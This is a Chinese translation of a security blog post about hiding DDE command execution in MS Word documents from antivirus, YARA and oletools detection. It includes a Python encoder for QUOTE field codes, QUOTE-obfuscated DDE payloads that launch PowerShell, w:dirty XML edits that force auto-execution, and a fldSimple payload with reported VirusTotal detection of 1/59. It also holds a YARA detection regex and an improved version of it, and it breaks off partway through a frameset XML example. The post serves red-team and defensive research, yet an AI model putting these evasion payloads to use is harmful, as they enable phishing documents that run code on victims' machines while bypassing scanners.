
# [翻译]MSWord-用字段代码混淆

[`原文链接`](#)

几周前`Saif El-Sherei`和我在[`SensePost`](#)的博客上发表了一篇关于`DDE`和在无需宏的情况下在`MSWord`中执行命令行的文章。这篇博客得到了比我预期多得多的关注。现在`DDE`已经被用在钓鱼邮件和恶意软件传播活动中，同时也被合法的红队采用。随着使用`DDE`进行的攻击的快速增长，对其的检测也开始加强，大多数杀毒引擎已经内建对`DDE`的基本检测。大多数这类检测基于`Yara`规则，通过在`.docx`和`.doc`文档中查找`DDE`或`DDEAUTO`字段实现。这让我开始思考是否能在文档外混淆`DDE`。目前已经有一两种这类尝试出现，威胁者已经改变`DDE`字符串的样式，并且将其分解到多行中，如这篇文章描述： [`Macroless DOC malware that avoids detection with Yara rule`](#)

在这篇博客中，我将分享我在混淆和绕过检测方面的尝试。希望这可以同时帮助攻击者和防御者。

## 混淆载荷

## 隐藏`DDE/DDEAUTO`

## 防御提示

### 混淆载荷

在深入探究混淆`DDE`和`DDEAUTO`字段代码的方法之前，我决定先关注混淆载荷。这样做的原因是双重的。首先，载荷是一段简单的字符串，而不是一段保留的字段代码，这意味着混淆不太可能打破其功能性。再者，我们在载荷混淆上有更多的空间，尝试去隐藏`3`个字符`(DDE)`比混淆`255`个字符有挑战性多了。

看着我们正在处理的字段代码，它感觉就像一个能发现一些更多混淆的好地方。对`“list field codes word”`的快速搜索指引我们到了这篇微软的支持文章，这篇文章包含一系列受支持的字段代码，这对于我们是有帮助的。在花了一些时间浏览这些不同的字段后，其中一个因其可能有帮助而引起了我的注意。这就是`QUOTE`字段，它有被描述为“Quote字段插入指定的文本到一个文档”的功能。这听起来让我们感到鼓舞，因为我们正在查找能操作载荷字符串的方法，而`QUOTE`字段允许操作一个字符串并且将其插入到一个文档。

作为一个旁注，记住这个字段代码可以被嵌入`word`是重要的，下面提供了一个使用`QUETO`字段的例子：

```
{ QUOTE { IF { DATE \@ "M" } = 1 "12" "{= { DATE \@ "M" } -1 }/1/03" \@ "MMMM"} }
```

这里我们嵌入了字段代码，`QUOTE`字段包含内部的`IF`字段代码的结果，它反过来包含`DATE`或格式化的时间，基于一个公式`(=)`。

`QUOTE`字段可以被用来提供一个字符原始值，它会自动转换这个值到对应的字符(很不幸我没有在发现关于这个的引用)。作为一个例子，如果我们想要去找出`65`这个值对应的字符，我们可以在`Word`里面使用下面的字段：

```
{ QUOTE 65 }
```
这最终会展示`A`而不是`65`，这正是我们在寻找的。我们现在可以将载荷表示为整数并且在`DDE`执行前让`word`将它们自动转换为字符。让这些起作用的整个系列的字段代码将会是：

```
{SET c "{QUOTE 65 65 65 65}"}

{SET d "{QUOTE 71 71 71 71}"}

{DDE {REF c} {REF d}}
```
这会有效地转换为：

```
{DDE "AAAA" "GGGG"}
```
现在你可以发挥你的想象，并知道我们将会用相应的载荷替换`AAAA`和`GGGG`。为了让这变得更简单，我写了一个快速的`Python`脚本来简单地将一个给定的字符串转化为相应的`QUOTE`字段。

```
#!/usr/env/python

print("Converts a string to the {QUOTE} Field code")

st = raw_input("String to convert: ")

v = map(lambda y: "%s"%ord(y),st)

print("{ QUOTE %s }"%' '.join(v))
```
为了弹出`powershell`，我们现在可以使用下面的字段代码：

```
{SET C "{QUOTE 67 58 92 92 80 114 111 103 114 97 109 115 92 92 77 105 99 114 111 115 111 102 116 92 92 79 102 102 105 99 101 92 92 77 83 87 111 114 100 46 101 120 101 92 92 46 46 92 92 46 46 92 92 46 46 92 92 46 46 92 92 119 105 110 100 111 119 115 92 92 115 121 115 116 101 109 51 50 92 92 119 105 110 100 111 119 115 112 111 119 101 114 115 104 101 108 108 92 92 118 49 46 48 92 92 112 111 119 101 114 115 104 101 108 46 101 120 101} "}

{DDE {REF C} "a"}
```

### 脏链接
需要指出的一件事是`DDEAUTO`会在文档打开时自动更新，正如它的名字所示。然而，并不是所有字段都会自动更新，除非我们在文档打开时点击“更新链接”。为了做到这点(或许有比我更好的方式)，我们需要去将我们的链接标记为“脏的”或将文档设置为自动更新链接。
一旦你创建了你的`.docx`文档，你可以用压缩软件打开这个文件，而且你需要修改`document.xml`。为了标记链接为肮的并且要求更新，需要在每个`<w:fldChar>`开始的地方增加

```
w:dirty="true"。

<w:fldChar w:fldCharType="begin" w:dirty="true"/>
```
保存`document.xml`并且更新这个压缩文件。现在你打开`.docx`，所有链接将会被自动更新。你也会接收到更为干净的“你是否想要自动更新”对话框。

### 结果
最大的问题是，除了使用`QUOTE`外，我们达到了任何目的吗？看起来是的。这个简单启动`powershell`的样本(我认为word打开powershell是恶意软件的一个指标)在[`VirusTotal`](https://www.virustotal.com/#/file/cce449cbfa35a3fb22399fa8842b98801b9216df6075e2db8b0e6c519d831e83/detection)上只有`1/59`的检出率。
通常你能够简单地将`.docx`文件存储为`.doc`并得到相同的代码执行。不幸的是，在这里你使用这种方法会在尝试打开`.doc`文件的时候收到“错误！没有指定的应用程序”，这是因为嵌入的字段代码并不能正确地自动更新。可能有一种强制更新所有字段代码的方法，但是我的`Word`知识有限，所以并不能找到一个这样的方法。

### 隐藏`DDE`
下一个挑战是尝试去从现有检测中隐藏，这包括`YARA`规则和对`DDE`链接的抽取。

#### `YARA`规则
大多数我见过的`YARA`规则尝试检测`.docx`文档(我关注`.docx`是因为它容易被修改)中`instrText`元素里面的`DDE`和`DDEAUTO`其中之一或两者。其中最早的一条`YARA`规则是被[`Nvsi Labs`](https://blog.nviso.be/2017/10/11/detecting-dde-in-ms-office-documents/)发布的并且包含以下正则：

```
/<w:fldChar\s+?w:fldCharType="begin"\/>.+?\b[Dd][Dd][Ee]\b.+?<w:fldChar\s+?w:fldCharType="end"\/>/
```
这在第一批恶意文档中工作得很好，但是随后就被分解为多行的变种所绕过。我(在多行的样本出现前)发现了另一个关于这个正则的问题，并将其报告给了`Didier Stevens`。当查看`Office Open XML`文件格式规范时，你会发现`fldchar`字段是“复合字段”类型，并且可以有一个额外属性。增加这个可选属性后既绕过了上面的`YARA`规则，也允许我们去使用`DDE`而不是`DDEAUTO`。这个属性叫做`dirty`，这个值如果被设置为布尔值的`true`，就会强制一次更新，正如在格式文档里描述的“特别的，这个值被一个应用程序标记以指明它的当前结果已经不再正确”那样。
这是和我上面在`QUOTE`字段里面使用以强制更新值的同一个属性。为了将其加入文档，简单地和之前那样并且手动修改`.docx`即可。

```
<w:r>

<w:fldChar w:fldCharType="begin" w:dirty="true"/>

</w:r>
```
正则马上就失效了，因为它不能匹配到这个可选属性。我向`Didier`提交了下列更新，这可以同时匹配到有可选属性的情况和`XML`可以包含任意空格的事实。

```
<w:fldChar\s+?w:fldCharType="begin"\s+?(w:dirty="(true|false)")?\s+?\/>.+?\b[Dd][Dd][Ee]\b.+?<w:fldChar\s+?w:fldCharType="end"\/>
```

#### `Oletools - msodde.py`
[`decalage2`](https://twitter.com/decalage2)的[`python-oletools`](https://github.com/decalage2/oletools)工具是一个我之前从未尝试过的相当有趣的项目。它在从所有`DDE`“攻击”的变种抽取`DDE`载荷方面工作得非常好。如果我们使用它来抽取我们的`QUOTE`版本，抽取出的`DDE`链接是清晰的，而且我们仍然可以知道`DDE`是存在的。
这需要稍微多一点的工作，但是你可以很容易地解码这些`QUOTE`值到可被执行的字符串。我们该如何绕过它呢？
回到`Office Open XML`文件格式规范(我喜爱规范)，我们得知存在另一个我们可以使用来引用字段代码的元素。从上面使用到现在的是都是`fldchar`的`“Complex Field”`字段，然而，还有一个“简单字段”的版本叫做：`fldSimple`。`fldSimple`元素并没有与`fldchar`相同的`<w:instrText>`子元素，它事实上将字段作为一个属性包含；`w:instr="FIELD CODE"`。
来自规范文档的例子如下：

```
<w:fldSimple w:instr="AUTHOR" w:fldLock="true">

<w:r>

<w:t>Rex Jaeschke</w:t>

</w:r>

</w:fldSimple>
```
这很容易被改成能让`DDE起作用的版本，而且我们简单将载荷嵌入如下：

```
<w:fldSimple w:instr='DDE "C:\\WINDOWS\\system32\\cmd.exe" "/k powershell.exe"' w:dirty="true">

<w:r>

<w:t>Pew</w:t>

</w:r>

</w:fldSimple>
```
这给了我们能自动执行的`DDE`，并且绕过了`Oletools`：
我向`oletools`[推送了更新](https://github.com/decalage2/oletools/pull/205)去检测嵌入在`fldSimple`元素里面的`DDE`链接。
这在对抗[杀毒引擎](https://www.virustotal.com/#/file/0f8bc14e32928ec882948977b25483a993fb8b4d9c8bc542aa13ecfbde785837/detection)方面也相当不错
记住基于行为的杀毒引擎应当能检测到这种类型的载荷执行，所以这些结果应该被视为“绕过静态扫描。”

### 副作用
当使用`fldSimple`时会带来一些副作用。如果你决定去使用`DDEAUTO`并且包含`w:dirty="true"`，在想要执行`DDE`应用程序之前，终端用户会被提示`3`次(不清楚为什么会有`3`次而不是`2`次)。这确实因为这你有`3`次他们点击“是”的机会而不是像通常一样。
有趣的是当使用`fldSimple`和`c:\\windows\\system32\\cmd.exe /k powershell`启动`powershell`时，`powershell`将会在`cmd`窗口内被执行，而不是直接启动`powershell`控制台。这和你从已存在的`cmd`实例中启动`powershell`是一样的行为。并且你会收到一则“不能加载PSReadLine模块”的消息。控制台运行时没有PSReadline”(截图)。也许有人会对深入研究这一点有兴趣？

### 没有`DDE`
现在，最后的胜利将会是在文档中完全没有`DDE`或`DDEAUTO`，这可能吗？这是肯定的，并且有社会工程学方面的附加益处。`MSWord`会足够友好去询问用户关闭保护模式以查看文档内容。
为了这一点，我们可以滥用另一个遗留特性(难道这些还不够好吗)。在某个时间点`Word`变成了一个任何相关文本的一站式商店，这包括创建网页。`Word`在某个点上是一个`HTML`的`IDE`，`HTML`从来不漂亮但是它能工作。大约在这个时间点被引入的事物是`frames`和`framesets`。`Frames`允许你去加载不同的`HTML/Text`页面到`word`的内部`frames`，`HTML`会自动解析和转换成Word格式的内容。这个功能似乎在`Word 2016`的用户界面中已被移除(也许更早)，但是下层的处理例程还在。这意味这你可以创建一个嵌入`frames`的文档，`Word`将会仍然为你解析。
为了插入一个`frameset`，你需要回去编辑一个新的`.docx`文档。首先解压，然后打开`webSetting.xml`。然后你需要去添加新的`XML`元素`frameset`：

```
<w:frameset>

<w:framesetSplitbar>

<w:w w:val="60"/>

<w:color w:val="auto"/>

<w:noBorder/>

</w:framesetSplitbar>

<w:frameset>

<w:frame>

<w:name w:val="1"/>

<w:sourceFileName r:id="rId1"/>
